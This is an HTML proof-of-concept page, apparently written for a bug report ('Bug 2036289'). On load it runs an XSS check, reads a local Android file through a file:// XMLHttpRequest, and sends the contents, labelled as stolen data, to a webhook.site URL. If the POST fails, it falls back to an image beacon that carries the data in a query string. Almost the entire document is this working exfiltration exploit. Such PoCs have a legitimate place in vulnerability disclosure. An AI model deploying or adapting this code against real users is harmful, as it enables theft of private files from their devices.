<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>PoC Data Exfiltration - Bug 2036289</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            padding: 20px;
            background-color: #f4f4f9;
            color: #333;
            text-align: center;
        }
        .container {
            border: 1px solid #ddd;
            padding: 20px;
            border-radius: 8px;
            background: #fff;
            box-shadow: 0 4px 6px rgba(0,0,0,0.1);
            display: inline-block;
            margin-top: 50px;
        }
        .status {
            font-weight: bold;
            color: #d9534f;
        }
    </style>
</head>
<body>

    <div class="container">
        <h2>PoC Eksploitasi Pembacaan File Lokal</h2>
        <p>Status Pengujian: <span id="status-text" class="status">Memulai pengujian...</span></p>
    </div>

    <script>
        // Konfigurasi Target dan Webhook kamu
        const targetFile = 'file:///sdcard/Download/test.txt';
        const webhookUrl = 'https://webhook.site/8020a520-ac20-474c-bb29-35cf02751528';
        const statusEl = document.getElementById('status-text');

        window.onload = function() {
            // Jalankan Alert awal untuk memastikan XSS aktif di konteks ini
            alert("XSS Berhasil di Domain: media\n\nMencoba membaca file lokal...");

            // Inisialisasi AJAX untuk membaca file lokal
            var xhr = new XMLHttpRequest();
            
            xhr.onreadystatechange = function() {
                if (xhr.readyState == 4) {
                    // Status 0 biasa terjadi pada skema file:// jika sukses
                    if (xhr.status == 200 || xhr.status == 0) {
                        var fileContent = xhr.responseText;
                        statusEl.innerText = "File berhasil dibaca! Mengirim data ke Webhook...";
                        statusEl.style.color = "#5cb85c";

                        // Kirim data yang berhasil dicuri ke Webhook.site milikmu
                        sendToWebhook(fileContent);
                    } else {
                        statusEl.innerText = "Gagal membaca file. Status: " + xhr.status;
                        sendErrorToWebhook("Gagal membaca file. Status: " + xhr.status);
                    }
                }
            };

            try {
                xhr.open('GET', targetFile, true);
                xhr.send();
            } catch (e) {
                statusEl.innerText = "Terblokir Kebijakan SOP/Sandbox: " + e.message;
                sendErrorToWebhook("Terblokir SOP: " + e.message);
            }
        };

        // Fungsi untuk Exfiltration Data
        function sendToWebhook(data) {
            fetch(webhookUrl, {
                method: 'POST',
                mode: 'cors',
                headers: {
                    'Content-Type': 'text/plain',
                },
                body: "STOLEN_DATA: " + data
            }).then(() => {
                alert("Data Berhasil Dikirim ke Webhook!");
            }).catch((err) => {
                // Jika POST diblokir, coba kirim via metode GET (Query Parameter)
                var img = new Image();
                img.src = webhookUrl + "?exfil=" + encodeURIComponent(data);
            });
        }

        // Fungsi untuk mencatat log error di Webhook kamu (untuk debugging)
        function sendErrorToWebhook(errorMsg) {
            var img = new Image();
            img.src = webhookUrl + "?error=" + encodeURIComponent(errorMsg);
        }
    </script>

</body>
</html>
